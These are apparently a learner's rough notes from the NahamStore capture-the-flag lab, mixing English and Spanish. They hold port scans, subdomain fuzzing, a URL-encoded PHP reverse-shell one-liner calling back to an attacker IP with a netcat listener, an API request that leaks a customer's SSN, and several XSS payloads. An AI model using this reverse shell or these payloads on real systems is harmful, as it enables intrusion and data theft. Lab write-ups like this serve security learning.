──(kali㉿kali)-[~/Downloads/NahamStore]
└─$ sudo nmap -sS --min-rate 5000 -p- --open -n -Pn 10.201.114.3 -oN scan.txt
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-01 09:51 EDT
Nmap scan report for 10.201.114.3
Host is up (0.27s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 14.92 seconds
                                                                                                                        
┌──(kali㉿kali)-[~/Downloads/NahamStore]
└─$ grep '^[0-9]' scan.txt | cut -d '/' -f1 | sort -u | xargs | tr ' ' ','
22,80,8000
                                                                                                                        
┌──(kali㉿kali)-[~/Downloads/NahamStore]
└─$ nmap -22,80,8000 -sV -sC -Pn -vvv -n 10.201.114.3 -oN fullScan.txt 
nmap: unrecognized option '-22,80,8000'
See the output of nmap -h for a summary of options.
                                                                                                                        
┌──(kali㉿kali)-[~/Downloads/NahamStore]
└─$ nmap -p22,80,8000 -sV -sC -Pn -vvv -n 10.201.114.3 -oN fullScan.txt 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-01 09:52 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:52
Completed NSE at 09:52, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:52
Completed NSE at 09:52, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:52
Completed NSE at 09:52, 0.00s elapsed
Initiating Connect Scan at 09:52
Scanning 10.201.114.3 [3 ports]
Discovered open port 22/tcp on 10.201.114.3
Discovered open port 80/tcp on 10.201.114.3
Discovered open port 8000/tcp on 10.201.114.3
Completed Connect Scan at 09:52, 0.26s elapsed (3 total ports)
Initiating Service scan at 09:52
Scanning 3 services on 10.201.114.3
Completed Service scan at 09:52, 11.99s elapsed (3 services on 1 host)
NSE: Script scanning 10.201.114.3.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:52
Completed NSE at 09:52, 7.58s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:52
Completed NSE at 09:52, 1.05s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:52
Completed NSE at 09:52, 0.00s elapsed
Nmap scan report for 10.201.114.3
Host is up, received user-set (0.26s latency).
Scanned at 2025-08-01 09:52:11 EDT for 21s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 84:6e:52:ca:db:9e:df:0a:ae:b5:70:3d:07:d6:91:78 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDk0dfNL0GNTinnjUpwRlY3LsS7cLO2jAp3QRvFXOB+s+bPPk+m4duQ95Z6qagERl/ovdPsSJTdiPXy2Qpf+aZI4ba2DvFWfvFzfh9Jrx7rvzrOj0i0kUUwot9WmxhuoDfvTT3S6LmuFw7SAXVTADLnQIJ4k8URm5wQjpj86u7IdCEsIc126krLk2Nb7A3qoWaI+KJw0UHOR6/dhjD72Xl0ttvsEHq8LPfdEhPQQyefozVtOJ50I1Tc3cNVsz/wLnlLTaVui2oOXd/P9/4hIDiIeOI0bSgvrTToyjjTKH8CDet8cmzQDqpII6JCvmYhpqcT5nR+pf0QmytlUJqXaC6T
|   256 1a:1d:db:ca:99:8a:64:b1:8b:10:df:a9:39:d5:5c:d3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC/YPu9Zsy/Gmgz+aLeoHKA1L5FO8MqiyEaalrkDetgQr/XoRMvsIeNkArvIPMDUL2otZ3F57VBMKfgydtBcOIA=
|   256 f6:36:16:b7:66:8e:7b:35:09:07:cb:90:c9:84:63:38 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPAicOmkn8r1FCga8kLxn9QC7NdeGg0bttFiaaj11qec
80/tcp   open  http    syn-ack nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: NahamStore - Setup Your Hosts File
|_http-favicon: Unknown favicon MD5: 8880CB0A929B848F386E68C5E3FA1676
| http-methods: 
|_  Supported Methods: GET HEAD POST
8000/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:52
Completed NSE at 09:52, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:52
Completed NSE at 09:52, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:52
Completed NSE at 09:52, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.41 seconds
                                                                                                                        
┌──(kali㉿kali)-[~/Downloads/NahamStore]
└─$ 












# DOMINIOS 

ffuf -u http://nahamstore.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "HOST: FUZZ.nahamstore.thm" -mc all -fw 125


shop                    [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 258ms]
marketing               [Status: 200, Size: 2025, Words: 692, Lines: 42, Duration: 272ms]
stock 

shop.nahamstore.thm marketing.nahamstore.thm stock.nahamstore.thm nahamstore-2020.nahamstore.thm nahamstore-2020-dev.nahamstore.thm









 `php%20-r%20%27%24sock%3Dfsockopen%28%2210.8.163.249%22%2C4444%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27`




─$ nc -nlvp 4444  



 connect to [10.8.163.249] from (UNKNOWN) [10.201.114.3] 38374
ls
css
index.php
js
robots.txt
uploads
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
pwd
/var/www/html/public
cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.2      2431fe29a4b0
127.0.0.1       nahamstore.thm
127.0.0.1       www.nahamstore.thm
172.17.0.1      stock.nahamstore.thm
172.17.0.1      marketing.nahamstore.thm
172.17.0.1      shop.nahamstore.thm
172.17.0.1      nahamstore-2020.nahamstore.thm
172.17.0.1      nahamstore-2020-dev.nahamstore.thm
10.131.104.72   internal-api.nahamstore.thm





 dirsearch -u http://nahamstore-2020-dev.nahamstore.thm -r



gobuster dir --url http://nahamstore-2020-dev.nahamstore.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt









http://nahamstore-2020-dev.nahamstore.thm/api/customers/?customer_id=2



{"id":2,"name":"Jimmy Jones","email":"jd.jones1997@yahoo.com","tel":"501-392-5473","ssn":"521-61-6392"}

{
"id": 2,
"name": "Jimmy Jones",
"email": "jd.jones1997@yahoo.com",
"tel": "501-392-5473",
"ssn": "521-61-6392"
}

















Intente activar el error, cambie el cifrado, por ejemplo. http://marketing.nahamstore.thm/8d1952ba2b3c6dcd76236f090ab8642c to http://marketing.nahamstore.thm/8d1952ba2b3c6dcd76236f090ab8642a




Inserte la carga útil xss: <script>alert(‘XSS’)</script> y se mostrará correctamente una ventana emergente de JavaScript

<script>alert('XSS');</script>

1. http://marketing.nahamstore.thm/?error=      <script>alert('XSS');</script>



## 2 xss   User-Agent


POST /basket HTTP/1.1
Host: nahamstore.thm
Content-Length: 37
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://nahamstore.thm
Content-Type: application/x-www-form-urlencoded
User-Agent: <script>alert('XSS');</script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://nahamstore.thm/basket
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: token=bb72697aca9485e60239d4733654c502; session=cb4e5b3a6057628857e96e0a65af6a2a
Connection: close
address_id=6&card_no=1234123412341234



## 3   title

http://nahamstore.thm/product?id=1&name=%3C/title%3E%3Cscript%3Ealert(%27XSS%27)%3C/script%3E%3C/title%3E





## 4   search


<script>
    var search = '&lt;script&gt;alert('XSS');&lt;/script&gt;';
    $.get('/search-products?q=' + search,function(resp){
        if( resp.length == 0 ){

            $('.product-list').html('<div class="text-center" style="margin:10px">No matching products found</div>');

        }else {
            $.each(resp, function (a, b) {
                $('.product-list').append('<div class="col-md-4">' +
                    '<div class="product_holder" style="border:1px solid #ececec;padding: 15px;margin-bottom:15px">' +
                    '<div class="image text-center"><a href="/product?id=' + b.id + '"><img class="img-thumbnail" src="/product/picture/?file=' + b.img + '.jpg"></a></div>' +
                    '<div class="text-center" style="font-size:20px"><strong><a href="/product?id=' + b.id + '">' + b.name + '</a></strong></div>' +
                    '<div class="text-center"><strong>$' + b.cost + '</strong></div>' +
                    '<div class="text-center" style="margin-top:10px"><a href="/product?id=' + b.id + '" class="btn btn-success">View</a></div>' +
                    '</div>' +
                    '</div>');
            });
        }
    });
</script>




"';alert('XSS');'"

<script>
var search = '"';alert('XSS');'"';

</script>





## 5

http://nahamstore.thm/returns/2?auth=c81e728d9d4c2f636f067f89cc14862c


</textarea><script>alert('XSS');</script>



## 6


http://nahamstore.thm/%3Cscript%3Ealert('XSS');%3C/script%3E







## 7 

: http://nahamstore.thm/product?id=1&added=1&discount=99999" "onmouseover=alert(documento.cookie)

¿Qué otro parámetro oculto puedes encontrar en la tienda cual pu





http://nahamstore.thm/product?id=2

<script>
$('.checkstock').click( function(){

$.post('/stockcheck',{
product_id  :   $(this).attr('data-product-id'),
server      :   'stock.nahamstore.thm'
},function(resp){
let obj = JSON.parse(resp);
alert( 'There are ' + obj.stock + ' items in stock');
});
});
</script>






# XXE


ffuf -u "http://nahamstore.thm/?FUZZ=https://google.com" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -ac (r & q)
